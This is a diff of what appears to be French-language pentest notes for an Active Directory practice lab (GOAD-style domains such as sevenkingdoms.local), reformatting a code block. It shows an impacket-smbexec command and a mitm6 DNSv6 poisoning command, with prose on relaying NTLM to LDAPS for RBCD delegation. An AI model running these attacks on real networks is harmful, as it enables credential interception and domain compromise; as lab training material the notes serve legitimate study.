@@ -65,8 +65,9 @@ proxychains impacket-smbexec -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22' -de
 
 Empoisonne les requêtes DNSv6 sur le réseau pour rediriger les clients vers un serveur WPAD contrôlé.
 
-<pre class="language-bash"><code class="lang-bash"><strong>mitm6 -i eth1 -d essos.local -d sevenkingdoms.local -d north.sevenkingdoms.local --debug
-</strong></code></pre>
+```bash
+mitm6 -i eth1 -d essos.local -d sevenkingdoms.local -d north.sevenkingdoms.local --debug
+```
 
 Relaye l'authentification NTLM interceptée vers LDAPS pour créer un compte machine avec délégation RBCD.
 
